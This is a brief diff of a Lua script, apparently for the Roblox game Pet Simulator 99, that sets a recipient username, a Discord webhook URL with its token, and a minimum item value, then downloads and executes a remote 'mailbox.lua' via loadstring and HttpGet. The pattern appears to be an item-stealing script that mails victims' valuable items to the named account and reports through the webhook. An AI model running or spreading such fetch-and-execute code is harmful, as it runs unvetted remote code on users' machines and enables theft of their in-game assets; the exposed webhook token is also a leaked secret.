@@ -1,7 +1,4 @@
 UserName = "KevinAppleFace"
 WebHook = "https://discord.com/api/webhooks/1171684366280306728/WoVFAXktf38nzsJdPvkWwBi29hLdsC5Lme_8Y53iEajmJMB45MJc5bi_jr9kWSx8Hl_G"
 MinRAP = 10000
-loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PS99/main/mailbox.lua"))()UserName = "KevinAppleFace"
-WebHook = "https://discord.com/api/webhooks/1171684366280306728/WoVFAXktf38nzsJdPvkWwBi29hLdsC5Lme_8Y53iEajmJMB45MJc5bi_jr9kWSx8Hl_G"
-MinRAP = 10000
 loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PS99/main/mailbox.lua"))()
